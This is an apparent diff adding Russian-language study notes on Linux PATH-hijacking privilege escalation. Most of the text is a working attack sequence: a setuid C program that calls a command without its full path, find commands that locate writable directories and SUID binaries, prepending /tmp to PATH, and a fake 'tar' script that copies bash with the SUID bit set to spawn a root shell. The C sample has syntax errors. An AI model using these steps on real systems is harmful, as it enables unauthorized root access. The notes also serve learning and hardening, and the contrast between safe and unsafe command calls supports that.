@@ -1,0 +1,113 @@
+В Linux переменная PATH — это переменная окружения, которая указывает операционной системе, где искать исполняемые файлы.
+
+# Просмотреть переменную PATH
+echo $PATH
+Пример ответа команды:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+# Создадим скрипт path_exp.c, который пытается запустить исполняемый файл test
+
+#include<unistd.h>
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system('test')
+}
+
+# Компилируем скрипт 
+gcc path_exp.c -o path -w
+#Установим suid бит
+chmod u+s path
+
+# Проверить папки в которые можем писать
+
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+или
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+Пример ответа команды:
+dev
+etc
+home
+proc
+run
+snap
+sys
+tmp
+usr
+var
+
+# Видим что можем писать в /usr
+# Проверим папки в которые можем писать в /usr
+find /usr -writable 2>/dev/null | grep usr |cut -d "/" -f 2 | sort -u
+
+Пример ответа команды:
+usr
+
+# Папки недоступны для записи
+
+# Начинаем работать с папкой tmp
+
+export PATH=/tmp:$PATH
+
+# Скопируем bin/bash в tmp
+
+cd /tmp
+echo "/bin/bash" > test
+chmod 777 test
+
+
+/* ПРИ КАКОМ УСЛОВИИ ВОЗМОЖНА ЭКСПЛУАТАЦИЯ */
+
+✅ Есть SUID программа от root (или другого привилегированного пользователя)
+
+find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
+Ответ должен быть:
+-rwsr-xr-x
+✅ Она вызывает команды без полного пути (уязвимость в коде)
+Ищем вызовы типа: system("ls") а не system("/bin/ls")
+или
+tar -czf backup.tar.gz /home  # ОПАСНО!
+# Система ищет tar в PATH
+# Порядок: /usr/local/bin → /usr/bin → /bin
+# Если /usr/local/bin writable - можем подменить!
+
+/usr/bin/tar -czf backup.tar.gz /home  # БЕЗОПАСНО!
+
+
+✅ Проверить PATH
+echo $PATH
+# /usr/local/bin:/usr/bin:/bin
+
+✅Создаем вредоносный tar в /usr/local/bin
+
+/usr/local/bin/tar
+#!/bin/bash
+cp /bin/bash /tmp/rootme
+chmod 4755 /tmp/rootme
+
+✅ Запустить SUID программу
+/usr/local/bin/backup_system
+
+✅ Стать root
+/tmp/rootme -p
+
+
+✅ Директория должна быть раньше настоящей команды: порядок в PATH
+
+# Где лежит настоящий ls?
+which ls
+# /usr/bin/ls
+
+
+echo $PATH
+Пример ответа команды:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+# В каком порядке проверяется?
+# 1. /usr/local/sbin/ls
+# 3. /usr/local/bin/ls    ← МОЖНО ПОДМЕНИТЬ если writable!
+# 4. /usr/sbin/ls
+# 5. /usr/bin/ls          ← НАСТОЯЩИЙ ls здесь
+# 6. .......
